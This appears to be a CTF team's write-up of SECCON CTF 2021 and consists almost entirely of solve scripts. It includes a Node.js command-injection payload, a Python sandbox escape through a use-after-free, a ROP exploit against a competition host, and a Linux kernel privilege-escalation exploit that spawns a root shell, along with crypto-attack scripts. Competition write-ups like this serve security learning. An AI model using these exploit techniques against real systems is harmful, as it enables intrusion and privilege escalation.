# SECCON CTF 2021

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20211211-secconctf2021/) of this writeup.**


 - [SECCON CTF 2021](#seccon-ctf-2021)
   - [Web](#web)
     - [Vulnerabilities](#vulnerabilities)
     - [Sequence as a Service 1 &amp; 2](#sequence-as-a-service-1--2)
     - [Cookie Spinner](#cookie-spinner)
   - [Pwn](#pwn)
     - [SecconTree](#seccontree)
       - [UAF   sandbox escape](#uaf--sandbox-escape)
       - [UAF   fake type](#uaf--fake-type)
     - [gosubof](#gosubof)
     - [pyast64  .pwn](#pyast64pwn)
     - [kone_gadget](#kone_gadget)
   - [Reverse](#reverse)
     - [pyast64  .rev](#pyast64rev)
     - [&lt;flag&gt;](#flag)
     - [sed programming](#sed-programming)
   - [Crypto](#crypto)
     - [Sign Wars](#sign-wars)
     - [oOoOoO](#oooooo)
     - [cerberus](#cerberus)
     - [XXX](#xxx)
   - [Misc](#misc)



## Web
### Vulnerabilities
### Sequence as a Service 1 & 2

```
/api/getValue?sequence=(call,x)=>(["\\","]-require('child_process').execSync('id')}))//"])&n=1

```

### Cookie Spinner

```
http://web:3000/?window=ownerDocument&view=<object id=ownerDocument></object><a id=ownerDocument name=location href="http://ginoah.tw"></a>
```

## Pwn

### SecconTree

#### UAF + sandbox escape
```python=
typ = dbg.__class__.__class__
str = typ('')
int = typ(0)
tuple = typ(())
bytes = typ(b'')
bytearray = typ(dbg.Bytearray(0))


tree_addr = dbg.Id(Tree)

def p64(x): return x.to_bytes(8, 'little')

outer = b''.join([
    p64(1), p64(dbg.Id(bytearray)),
    p64(0x0ffffffffffffffe), p64(0x0fffffffffffffff),
    p64(0x0), p64(0x0),
])

oaddr = dbg.Id(outer)
dbg.Print(f'0x{oaddr:08x}')

buf = p64(1) + p64(tree_addr) + p64(oaddr+0x20) + p64(0)


y_obj = typ('Y', (), {'__repr__': lambda x: 'victim'})

x = Tree('root')
z = Tree('repl')

y = y_obj()
y = Tree(y)
x.add_child_left(y)
del y
y = None

def callback(_):
    dbg.Print('triggered')
    x.add_child_left(z)

hook_str = typ('Hook', (str,), {'__del__': callback})
hook_obj = typ('Hook', (), {'__repr__': lambda x: hook_str("victim")})
hook = hook_obj()

uaf = x.find(hook)
yaddr = dbg.Id(uaf)
dbg.Print(f'0x{yaddr:08x}')

rawuaf = dbg.Bytearray(buf)
dbg.Print(uaf)
mem = uaf.get_object()
dbg.Print(mem[tree_addr:tree_addr+0x10])

def get(x):
    rawuaf[16:24] = p64(x)
    return uaf.get_object()

def deref(x):
    return int.from_bytes(mem[x:x+8], 'little')

def wr(x, v):
    mem[x:x+8] = v.to_bytes(8, 'little')

cmd = '''
echo pwned
bash --login
'''

def func():
    for i in ().__dmbtt__.__cbtft__[0].__tvcdmbttft__():
        try:
            i.__joju__.__hmpcbmt__.hfu('sy'+'s').npevmft['o'+'s'].tztufn(dne)
            break
        except:
            pass

tab = {'b': 'a', 'c': 'b', 'd': 'c', 'e': 'd', 'f': 'e', 'g': 'f', 'h': 'g', 'i': 'h', 'j': 'i', 'k': 'j', 'l': 'k', 'm': 'l', 'n': 'm', 'o': 'n', 'p': 'o', 'q': 'p', 'r': 'q', 's': 'r', 't': 's', 'u': 't', 'v': 'u', 'w': 'v', 'x': 'w', 'y': 'x', 'z': 'y', '_': '_'}

func_addr = dbg.Id(func)
cod = get(deref(func_addr + 0x10))
names = tuple(''.join(tab[e] for e in n) for n in cod.co_names)
dbg.Print(names)
cod = cod.replace(co_names=names)
cod_addr = dbg.Id(cod)
wr(func_addr+0x10, cod_addr)
func()
```

#### UAF + fake type
```python=
typ = dbg.__class__.__class__
str = typ('')
int = typ(0)
bytearray = typ(dbg.Bytearray(0))

tree_addr = dbg.Id(Tree)

def u64(bytestring):
    num = 0
    for i in [7,6,5,4,3,2,1,0]:
        num<<=8
        num+=bytestring[i]
    return num

def p32(x): return x.to_bytes(4, 'little')

def p64(x): return x.to_bytes(8, 'little')

def fakePyObject_construct(ob_refcnt=0,ob_typ=0):
    return p64(ob_refcnt)+p64(ob_typ)

def fakePyVarObject_construct(PyObjectparam=(0,0),ob_size=0):
    return fakePyObject_construct(PyObjectparam[0],PyObjectparam[1])+p64(ob_size)

def fakeByteArray_construct(PyVarObjectParam=(0,0,0),ob_alloc=0,ob_addr=0,ob_start=0,ob_exports=0):
    return fakePyVarObject_construct(PyVarObjectParam[:2],PyVarObjectParam[-1])+p64(ob_alloc)+p64(ob_addr)+p64(ob_start)+p64(ob_exports)

def fakePyTypeObject_construct(PyVarObjectParam=(0,0,0),tp_name=0,tp_basicsize=0,tp_itemsize=0,tp_dealloc=0,tp_print=0,tp_getAttr=0,tp_setAttr=0,tp_as_async=0,tp_repr=0,tp_as_number=0,tp_as_sequence=0,tp_as_mapping=0,tp_hash=0,tp_call=0,tp_str=0,tp_getAttro=0,tp_setAttro=0,tp_as_buffer=0,tp_flags=0,tp_doc=0,tp_traverse=0,tp_clear=0,tp_richcompare=0,tp_weaklistoffset=0,tp_iter=0,tp_iternext=0,tp_methods=0,tp_members=0,tp_getset=0,tp_Base=0,tp_dic=0,tp_descr_get=0,tp_descr_set=0,tp_dictoffset=0,tp_init=0,tp_alloc=0,tp_new=0,tp_free=0,tp_is_gc=0,tp_Bases=0,tp_Mro=0,tp_cache=0,tp_suClasses=0,tp_weaklist=0,tp_del=0,tp_version_tag=0,tp_finalize=0):
    return fakePyVarObject_construct(PyVarObjectParam[:2],PyVarObjectParam[-1])+p64(tp_name)+p64(tp_basicsize)+p64(tp_itemsize)+p64(tp_dealloc)+p64(tp_print)+p64(tp_getAttr)+p64(tp_setAttr)+p64(tp_as_async)+p64(tp_repr)+p64(tp_as_number)+p64(tp_as_sequence)+p64(tp_as_mapping)+p64(tp_hash)+p64(tp_call)+p64(tp_str)+p64(tp_getAttro)+p64(tp_setAttro)+p64(tp_as_buffer)+p64(tp_flags)+p64(tp_doc)+p64(tp_traverse)+p64(tp_clear)+p64(tp_richcompare)+p64(tp_weaklistoffset)+p64(tp_iter)+p64(tp_iternext)+p64(tp_methods)+p64(tp_members)+p64(tp_getset)+p64(tp_Base)+p64(tp_dic)+p64(tp_descr_get)+p64(tp_descr_set)+p64(tp_dictoffset)+p64(tp_init)+p64(tp_alloc)+p64(tp_new)+p64(tp_free)+p64(tp_is_gc)+p64(tp_Bases)+p64(tp_Mro)+p64(tp_cache)+p64(tp_suClasses)+p64(tp_weaklist)+p64(tp_del)+p32(tp_version_tag)+p32(0)+p64(tp_finalize)

def fakePyMethodDef_construct(ml_name=0,ml_meth=0,ml_flags=0,ml_doc=0):
    return p64(ml_name)+p64(ml_meth)+p32(ml_flags)+p32(0)+p64(ml_doc)

outer = b''.join([
    p64(1), p64(dbg.Id(bytearray)),
    p64(0x0ffffffffffffffe), p64(0x0fffffffffffffff),
    p64(0x0), p64(0x0),
])

oaddr = dbg.Id(outer)
dbg.Print(f'0x{oaddr:08x}')

buf = p64(1) + p64(tree_addr) + p64(oaddr+0x20) + p64(0)


y_obj = typ('Y', (), {'__repr__': lambda x: 'victim'})

x = Tree('root')
z = Tree('repl')

y = y_obj()
y = Tree(y)
x.add_child_left(y)
del y
y = None

def callback(_):
    dbg.Print('triggered')
    x.add_child_left(z)

hook_str = typ('Hook', (str,), {'__del__': callback})
hook_obj = typ('Hook', (), {'__repr__': lambda x: hook_str("victim")})
hook = hook_obj()

uaf = x.find(hook)
yaddr = dbg.Id(uaf)
dbg.Print(f'0x{yaddr:08x}')

rawuaf = dbg.Bytearray(buf)
dbg.Print(uaf)
mem = uaf.get_object()
dbg.Print(mem[tree_addr:tree_addr+0x10])

def get(x):
    rawuaf[16:24] = p64(x)
    return uaf.get_object()

def deref(x):
    return int.from_bytes(mem[x:x+8], 'little')

def wr(x, v):
    mem[x:x+8] = v.to_bytes(8, 'little')

###
sy_plt = 0x4214f0


func = lambda :0
func_addr = dbg.Id(func)

cod = get(deref(func_addr + 0x10))
cod = cod.replace(co_names=())
cod_addr = dbg.Id(cod)

fakeTypeObject = fakePyTypeObject_construct(tp_getAttro=sy_plt)
fakeObject = fakePyVarObject_construct((u64(b'/bin/sh\x00')-2,dbg.Id(fakeTypeObject)+0x20),0)

dbg.Print(dbg.Hex(dbg.Id(fakeObject)))

wr(func_addr, u64(b'/bin/sh\x00'))
wr(func_addr+0x8, dbg.Id(fakeTypeObject)-0x8)
dbg.Print(dbg.Hex(func_addr),dbg.Hex(cod_addr))
dbg.Print('written')
cod.Sy()
```

### gosubof

ROP goes brrr

```python=
from pwn import *

###Addr
#  libc2.31
gets_plt = 0x401040
bss = 0x404800
IO_file_underflow_offset = 0x93ba0

###ROPgadget
pop_rdi = 0x4011c3
pop_rbp = 0x40111d
leave = 0x401158
set_param = 0x4011ba
call_func = 0x4011a0
add_rbp_val_ebx = 0x40111c
one_gadget = 0xe6e79

###Exploit
r = remote('hiyoko.quals.seccon.jp',9002)

padding = b'\x00'*0x88
ROPchain = p64(pop_rdi)+p64(bss)+\
           p64(gets_plt)+\
           p64(pop_rbp)+p64(bss-8)+\
           p64(leave)
payload = padding+ROPchain
r.sendline(payload)

ROPchain = p64(pop_rdi)+p64(bss+0x400)+\
           p64(gets_plt)+\
           p64(set_param)+p64(((1<<32)+one_gadget-(IO_file_underflow_offset+383))&0xffffffff)+p64(bss-0x88+0x3d)+p64(0)+p64(0)+p64(0)+p64(0)+\
           p64(add_rbp_val_ebx)+\
           p64(set_param)+p64(0)+p64(bss)+p64(0)+p64(0)+p64(0)+p64(bss-0x88)+\
           p64(call_func)

r.sendline(ROPchain)
sleep(1)
r.sendline('M30W')

r.interactive()
```

### pyast64++.pwn

The fix for argument length is not complete, assigning duplicate args still allows stack OOB

```python=
setupJOP()

def setupJOP():
    overwriteRIP(a,a)
    a = 0x04eb5854  #push rsp;          pop rax
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686200c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686900c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686e00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x682f00c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x687300c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x686800c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04ebc0fe  #inc al;
    a = 0x680000c6  #mov [rax], 0x10;   push ????
    a = 0x04eb905f  #pop rdi;           nop
    a = 0x04eb5f54  #push rsp;          pop rdi
    a = 0x04ebf631  #xor esi, esi
    a = 0x04ebd231  #xor edx, edx
    a = 0x04ebc031  #xor eax, eax
    a = 0x050f3bb0  #mov al, 0x3b;      syscall

def overwriteRIP(num1,num1):
    num1+=0x7
```

### kone_gadget
```cpp=
/*
 * seccomp example with syscall reporting
 *
 * Copyright (c) 2012 The Chromium OS Authors <chromium-os-dev@chromium.org>
 * Authors:
 *  Kees Cook <keescook@chromium.org>
 *  Will Drewry <wad@chromium.org>
 *
 * The code may be used by anyone for any purpose, and can serve as a
 * starting point for developing applications using mode 2 seccomp.
 */
#define _GNU_SOURCE 1
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include "config.h"
#include "seccomp-bpf.h"

int pfd[2],tmp;


struct sock_filter filter[0x800];

static int install_syscall_filter(void)
{
	int i = 0;

	struct sock_filter table[] = {
		BPF_STMT(BPF_LD+BPF_K, 0x01eb9090),
		BPF_STMT(BPF_LD+BPF_K, 0x75cb010f),
		BPF_STMT(BPF_LD+BPF_K, 0x01ebc030),
		BPF_STMT(BPF_LD+BPF_K, 0x61c3c489),
		BPF_STMT(BPF_LD+BPF_K, 0xc3c78948),
		BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
	};
	for(;i<0x680;i++)
		filter[i] = table[0];

	for(int k=1;k<6;k++)
		filter[i++] = table[k];


	/*

	struct sock_filter filter[] = {
		BPF_STMT(BPF_LD+BPF_K, 0x01eb9090),
		BPF_STMT(BPF_LD+BPF_K, 0x01eb9090),
		BPF_STMT(BPF_LD+BPF_K, 0x75cb010f),
		BPF_STMT(BPF_LD+BPF_K, 0x01ebc030),
		BPF_STMT(BPF_LD+BPF_K, 0x61c3c489),
		BPF_STMT(BPF_LD+BPF_K, 0xc3c78948),
		BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
	};
	*/
	struct sock_fprog prog = {
		.len =  i,
		.filter = filter,
	};
	for(int i=0;i<0x10;i++){
		int fd = socket(1,2,0);
		setsockopt(fd,SOL_SOCKET,26,&prog,sizeof(prog));
	}


	return 0;

}

#define prepare_kernel_cred 0xffffffff81073c60
#define poprdi 0xffffffff81138833
#define commit_creds 0xffffffff81073ad0
#define mov_rdi_rax x+15
#define swapgs 0xffffffff8161900e
#define iretq 0xffffffff8160257d
#define poprbp 0xffffffff81000599

// #0xffffffff8107d6b8: mov rdi, rax; mov eax, dword ptr [rip + 0xdb9267]; leave; cmp rax, rdi; cmovb rax, rdi; ret;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
    __asm__ (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("[*] status has been saved.");
}


void spawn_shell() {
    if (!getuid()) {
        system("/bin/sh");
    } else {
        puts("[*] spwan shell error!");
    }
    exit(0);
}


int main(int argc, char *argv[])
{
	save_status();
	signal(SIGSEGV,spawn_shell);
	install_syscall_filter();

	size_t x = 0xffffffffc0015246+2; 
	//scanf("%lx",&x);
	unsigned addr = (unsigned)x;
	mmap( (addr&(~0xfff))-0x10000 ,0x20000,7,34,-1,0);
	size_t *rop = (addr&(~0xff));
	int i=0;

	rop[i++] = poprdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;
	rop[i++] = poprbp;
	rop[i++] = &rop[i+0x8];
	rop[i++] = 0xffffffff8107d6b8UL;
      	
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;
	rop[i++] = poprdi+1;

	rop[i++] = commit_creds;
	rop[i++] = swapgs;
	rop[i++] = iretq;

	rop[i++] = (size_t) spawn_shell; // rip

	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	syscall(1337,x);

	return 0;
}

```
## Reverse

### pyast64++.rev

```python=
from pwn import *

def encrypt(inp):
    res = inp

    K = b'SECCON2021'
    S = [0xff-i for i in range(0x100)]
    j = 0
    for i in range(0x100):
        j = (j+S[i]+K[i%10])&0xff
        S[i],S[j] = S[j],S[i]

    permute = [pow(i,3,0x43)&0x3f for i in range(0x40)]

    for k in range(10):
        res = [S[res[i]] for i in range(0x40)]
        res2 = []
        for i in range(8):
            v = list(''.join([bin(res[i*8+j])[2:].rjust(8,'0') for j in range(8)][::-1])[::-1])
            for j in range(0x40):
                v[j], v[permute[j]] = v[permute[j]], v[j]
            v = ''.join(v)
            for j in range(8):
                res2.append(int(v[j*8:(j+1)*8][::-1],2))
        for i in range(0x40):
            res2[i]^=K[k]
        res = res2
    return res

def decrypt(res):
    K = b'SECCON2021'
    S = [0xff-i for i in range(0x100)]
    j = 0
    for i in range(0x100):
        j = (j+S[i]+K[i%10])&0xff
        S[i],S[j] = S[j],S[i]
    invS = [0 for i in range(0x100)]
    for i in range(0x100):
        invS[S[i]] = i

    permute = [pow(i,3,0x43)&0x3f for i in range(0x40)]

    for k in range(9,-1,-1):
        res = [res[i]^K[k] for i in range(0x40)]
        res2 = []
        for i in range(8):
            v = list(''.join([bin(res[i*8+j])[2:].rjust(8,'0') for j in range(8)][::-1])[::-1])
            for j in range(0x3f,-1,-1):
                v[j], v[permute[j]] = v[permute[j]], v[j]
            v = ''.join(v)
            for j in range(8):
                res2.append(invS[int(v[j*8:(j+1)*8][::-1],2)])
        res = res2
    return res

target = [0x4b,0xcb,0xbe,0x7e,0xb8,0xa9,0x1b,0x4a,0x23,0x53,0x71,0x41,0xcf,0xc1,0x1b,0x89,0x25,0x62,0x0,0x44,0xdb,0x71,0x15,0xb4,0xdf,0x87,0x5,0x81,0xbd,0xc8,0xf5,0x64,0x75,0x3e,0xc0,0x65,0xef,0x5c,0xb6,0x88,0x9f,0xeb,0xa6,0x5a,0x4a,0x85,0x53,0x4e,0x6,0xe1,0x65,0x67,0x52,0x4e,0x90,0xcd,0x82,0xee,0xaf,0xf5,0xac,0x3e,0x9d,0xb0]
print(bytes(decrypt(target)))
```

### \<flag\>
    
```python=
import binascii
from pwn import *

K = b'NekoPunch'
enc = binascii.unhexlify('6dbf84f73cf6a112268b09525ea550a665e21cb2e3e13af7e3ea0ecb52f5b9cda5b6522b1e978734553f1d7956d4af94bfc3f4d68c8fba9eeecf4035550b9106f70d57d1a6cdaf3211eaaa78d71a9038b71be621241e8b608a43b107f8860f543ab0189aa063800de4bae7d0b11045b8')

def ROL8(n,r):
    return ((n<<r)|(n>>(8-r)))&0xff

def QR(state,a,b,c,d):
    state[b]^=ROL8(((state[a]+state[d])&0xff),1)
    state[c]^=ROL8(((state[b]+state[a])&0xff),2)
    state[d]^=ROL8(((state[c]+state[b])&0xff),3)
    state[a]^=ROL8(((state[d]+state[c])&0xff),4)

def QRinv(state,a,b,c,d):
    state[a]^=ROL8(((state[d]+state[c])&0xff),4)
    state[d]^=ROL8(((state[c]+state[b])&0xff),3)
    state[c]^=ROL8(((state[b]+state[a])&0xff),2)
    state[b]^=ROL8(((state[a]+state[d])&0xff),1)

def encrypt(p,K):
    L = len(p)
    c = b''
    state = list(K[:8])+[0 for i in range(8)]
    for i in range(0,L,8):
        for j in range(8):
            print(j,i+j)
            state[j+8] = p[i+j]
        for j in range(128):
            QR(state,0,4,8,12)
            QR(state,5,9,13,1)
            QR(state,10,14,2,6)
            QR(state,15,3,7,11)
            QR(state,0,1,2,3)
            QR(state,5,6,7,4)
            QR(state,10,11,8,9)
            QR(state,15,12,13,14)
        c+=bytes(state)
    return c

def decrypt(c,K):
    L = len(c)
    p = b''
    state = list(c[-8:])+[0 for i in range(8)]
    state = [0 for i in range(16)]
    for i in range(0,L,16):
        for j in range(16):
            state[j] = c[i+j]
        for j in range(128):
            QRinv(state,15,12,13,14)
            QRinv(state,10,11,8,9)
            QRinv(state,5,6,7,4)
            QRinv(state,0,1,2,3)
            QRinv(state,15,3,7,11)
            QRinv(state,10,14,2,6)
            QRinv(state,5,9,13,1)
            QRinv(state,0,4,8,12)
        p+=bytes(state[8:])
    return p

print(decrypt(enc,K))
```

### sed programming
```python
import re
from collections import Counter


charset = set('I1l')

encode = []
decode = []
transition = []

def escape(x):
    return ''.join(e if e in charset else f'<{e}>' for e in x)

with open('./checker.sed') as f:
    for line in f:
        if line.strip() == ':t':
            break

    for line in f:
        line = line.strip()[2:-4]
        src, dst = map(escape, line.split('/'))

        if all(e in charset for e in src + dst) or src == '<^>':
            transition.append((src, dst))
        elif any(e in charset for e in src):
            decode.append((src, dst))
        else:
            encode.append((src, dst))

encode = sorted(encode)
decode = sorted(decode)

src_symbols = Counter()
dst_symbols = Counter()


for lst in [encode, decode, transition]:
    for src, dst in lst:
        src_symbols.update(re.findall(r'1[^1]*1', src))
        dst_symbols.update(re.findall(r'1[^1]*1', dst))
sk = set(src_symbols.keys())
dk = set(dst_symbols.keys())
assert sk == dk
print(len(sk))
for k in sorted(sk):
    print(k, src_symbols[k], dst_symbols[k])

sk = sorted(sk)
mapping = {
    '1II1': 'S',
    '1IIIl1': 'X',
    '1IlIl1': 'A',
    '1IIll1': 'B',
    '1IIlI1': '<',
    '1l1': '>',
    '1IlI1': ']',
}
sk = [e for e in sk if e not in mapping]
mapping.update({e: f'{i:x}' for i, e in enumerate(sk)})
for k, v in mapping.items():
    print(f'{v}: {k}')

def sub(x):
    return mapping[x.group(0)]
    # return f'<{mapping[x.group(0)]}>'

for lst in [encode, decode, transition]:
    nxt = []
    for src, dst in lst:
        src = re.sub(r'1[^1]*1', sub, src)
        dst = re.sub(r'1[^1]*1', sub, dst)
        nxt.append((src, dst))
    lst.clear()
    lst.extend(nxt)


reject = []
cleanup = []
trans1 = []
trans2 = []
trigger = []

for src, dst in transition:
    if src == '<^>':
        trigger.append((src, dst))
    elif 'X' in src:
        cleanup.append((src, dst))
    elif 'X' in dst:
        reject.append((src, dst))
    elif dst.endswith('S') and all(e in 'SAB' for e in src):
        trans1.append((src, dst))
    else:
        trans2.append((src, dst))

reject = sorted(reject)
trans1 = sorted(trans1)

for lst in [encode, decode, reject, cleanup, trans1, trans2, trigger]:
    print('')
    for src, dst in lst:
        tag = ''
        print(f'{src:50s} {dst:50s} {tag}')


encode = {src[1:-1]: dst for src, dst in encode}
reject = set(src for src, dst in reject)
trans1 = dict(trans1)

def trans(x):
    x = x.group(0)
    if x in reject:
        raise EOFError(x)
    return trans1[x]

def emu(inp):
    inp = ''.join(encode[e] for e in inp)

    while inp != 'S':
        org = inp
        if re.search(r'S[AB]+S[AB]', inp) is not None:
            while re.search(r'S[AB]+S[AB]', inp) is not None:
                try:
                    inp = re.sub(r'S[AB]+S[AB]', trans, inp)
                except EOFError:
                    return inp

        for src, dst in trans2:
            if src in inp:
                org = inp
                inp = inp.replace(src, dst)
                break
        else:
            # print('Start', inp)
            inp = trigger[0][1] + inp

possible = '023456789ABCDEFGHJKLMNOPQRSTUVWXYZ_abcdefghijkmnopqrstuvwxyz{}'

prefix = 'SECCON{'

from tqdm import tqdm, trange
for _ in trange(10):
    res = [(len(emu(prefix + e + 'Z'*4)), e) for e in tqdm(possible, leave=False)]
    print(sorted(res))
    size, e = min(res)
    prefix += e
    print(size, e, prefix)
```


## Crypto
### Sign Wars
```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Util.Padding import pad
import random
import ast


# P-384 Curve
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
curve = EllipticCurve(GF(p), [a, b])
order = 39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643
Z_n = GF(order)
gx = 26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087
gy = 8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871
G = curve(gx, gy)

with open('./output.txt') as f:
    sig1 = ast.literal_eval(f.readline())
    sig2 = ast.literal_eval(f.readline())


# Solve by LLL (biased random)
"""
s = (h + rx) / k0
k0 = (k3 * 2^256) + (k1) + (h * 2^128)
k0 = Z + (h * 2^128)
k0 = Z + H
h < 2^128
s = (h + rx) / (Z + H)
Z + H = (h + rx) / s
k3 t256 + k1 + h t128 = h/s + r/s x
k3 t256 + k1 + h (t128 - 1/s) = r/s x


t256         1   0   0
q            0   0   0
r/s          0   1   0
(t128-1/s)   0   0   1

k1           k3  x   h
"""

q = order
W = 10
L = zero_matrix(ZZ, W*2+2, W*2+2)

for i, (r,s,*_) in enumerate(sig1[:W]):
    
    t128, t256 = 1 << 128, 1 << 256
    invs = inverse_mod(s, q)
    # assert ((k3 * t256 + k1 + h * t128 - h*invs - r*invs*x) % q) == 0

    u = r * invs % q
    v = (t128 - invs) % q

    off = i*2
    L[off+0, off] = ZZ(t256) * 2^256
    L[off+1, off] = ZZ(q) * 2^256
    L[-2,    off] = ZZ(u) * 2^256
    L[-1,    off] = ZZ(v) * 2^256
    L[off+0, off+1] = 1 * 2^256
L[-2,-2] = 1 * 1
L[-1,-1] = 1 * 2^256

B = L.LLL()
for row in B:
    x = abs(row[-2])
    h = abs(row[-1])
    if h == 0 or h % 2^256 != 0:
        continue
    h = h // 2^256

    ok = True
    for i, (r,s,*_) in enumerate(sig1):
        # s = (h + rx) / k
        kk = int((h + r*x) * inverse_mod(s, q) % q)
        hh = (kk >> 128) & ((1 << 128) - 1)
        if hh != h:
            ok = False
            break
    if ok:
        print('Found')
        print(f'x = {x}')
        print(f'h = {h}')
        break
print(long_to_bytes(x))


# Solve by reconstructing PRNG
from mt import MT19937, tobin, untamper, tamper

mt = MT19937()
remain = None

for i, (r,s,*_) in enumerate(sig1):
    # s = (h + rx) / k
    kk = int((h + r*x) * inverse_mod(s, q) % q)
    k1 = (kk >>   0) & ((1 << 128) - 1)
    k2 = (kk >> 128) & ((1 << 128) - 1)
    k3 = (kk >> 256) & ((1 << 128) - 1)
    assert k2 == h

    for b in tobin(k1, n=128):
        remain = mt.add(b)
    for b in tobin(k3, n=128):
        remain = mt.add(b)

assert remain == 0
rec = mt.reconstruct('python')

M = []
v = []
for i, (r,s,*_) in enumerate(sig2):
    # print(k == rec.getrandbits(384))
    k = rec.getrandbits(384)
    # s = (z2 + r*d) / k
    # s*k = z2 + r*d
    M.append([1, r])
    v.append(s*k % q)
M = Matrix(Z_n, M)
v = vector(Z_n, v)
print(long_to_bytes(x) + long_to_bytes(M.solve_right(v)[1]))
```

### oOoOoO
```python
from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime
import random
from telnetlib import Telnet

conn = Telnet('oooooo.quals.seccon.jp', int(8000))
p = int(conn.read_until(b'\n')[4:])
S = int(conn.read_until(b'\n')[4:])

N = 128
# N = 4
message = b""
v = []
for _ in range(N):
    r = random.getrandbits(1)
    message += b"o" if r == 1 else b"O"
    v.append(r)
print(message)

# p = getPrime(len(message) * 5)
# S = bytes_to_long(message) % p
T = (S - bytes_to_long(b'O' * N)) % p

M = []
for i in range(N):
    m = b' '.rjust(i+1, b'\0').ljust(N, b'\0')
    m = bytes_to_long(m) % p
    M.append(m)

# print(p)
# print(T)
# print(Matrix(Zmod(p), M) * vector(Zmod(p), v))
# print(S)

M.extend([-T, p])
L = identity_matrix(len(M))
L[:, -1] = Matrix(ZZ, M).T
B = L.BKZ()

ans = B[0]
assert ans[-1] == 0
if ans[-2] < 0:
    ans = -ans

assert all(0 <= e <= 1 for e in ans)
print(ans[:-2] == vector(v))

msg = b''.join(b'o' if e else b'O' for e in ans[:-2])
print(msg)
conn.write(msg + b'\n')
conn.interact()
conn.close()
```

### cerberus
```python=
import base64
from Crypto.Util.Padding import pad, unpad
from Crypto.Util.strxor import strxor
import signal

from telnetlib import Telnet

conn = Telnet('cerberus.quals.seccon.jp', int(8080))
conn.read_until(b'\n')
spell = conn.read_until(b'\n')
c = base64.b64decode(spell)
ref_iv, ref_c = c[:16], c[16:]

def oracle(ivs, c):
    for iv in ivs:
        conn.write(base64.b64encode(iv+c).replace(b'\n', b'') + b'\n')
    res = []
    conn.read_until(b'spell:')
    for _ in ivs:
        res.append(conn.read_until(b'\n').endswith(b':)\n'))
    return res

def block_oracle(iv0, prefix, block, prev=b'\0'*16):
    plain = bytearray(b'\0' * 16)
    for p in range(15, -1, -1):
        iv = strxor(iv0, plain)
        iv = strxor(iv, pad(b'\0'*p, 16))
        m = bytearray(b'\0' * 16)
        ivs = []
        for c in range(256):
            m[p] = c
            ivs.append(strxor(iv, m))
        res = oracle(ivs, prefix+block)
        assert sum(res) == 1, sum(res)
        plain[p] = next(iter(i for i, e in enumerate(res) if e))
        print(strxor(plain, prev))
    return strxor(plain, prev)

b0 = b'\0' * 16
p0 = block_oracle(ref_iv, ref_c, b0)

prev = strxor(p0, ref_iv)
pfix = ref_c + b0
flag = b''
for i in range(0, len(ref_c), 16):
    print('\n' + '='*10, i, '='*10)
    p = block_oracle(ref_iv, pfix, ref_c[i:i+16], prev)
    prev = strxor(p0, strxor(p, ref_c[i:i+16]))
    flag += p
    print(flag)
```

### XXX
```python=
import os
import ast


with open('./output.txt') as f:
    p = ast.literal_eval(f.readline())
    params = ast.literal_eval(f.readline())
    
Fp = GF(p)

"""
b1 - b2 = y1^2 - y2^2 - (a1-a2) * x

b1-b2 b1-b3 1 0
a1-a2 a1-a3 0 1
p     0     0 0
0     p     0 0

ydiff ydiff x
"""

alpha = 1 << int(int(p).bit_length() / 2.5)

bds, ads, yds, mul = [], [], [], [1, x]
for a1, b1, *_ in params[:1]:
    for a2, b2, *_ in params:
        bdiff, adiff = (b1-b2)%p, (a1-a2)%p
        if bdiff == 0 or adiff == 0:
            continue
        bds.append(bdiff)
        ads.append(adiff)
        

L = zero_matrix(ZZ, len(bds)+2, len(bds)+2)
L[0,:-2] = Matrix(ZZ, bds)
L[1,:-2] = Matrix(ZZ, ads)
L[2:,:-2] = identity_matrix(ZZ, len(bds)) * p
L[0, -2] = alpha^2
L[1, -1] = alpha

B = L.LLL()
ans = B[0]
if ans[-1] < 0:
    ans = -ans
assert ans[-2] == alpha^2
assert ans[-1] % alpha == 0
x = ans[-1] // alpha
print(int(x).to_bytes(128, 'big'))
```

## Misc
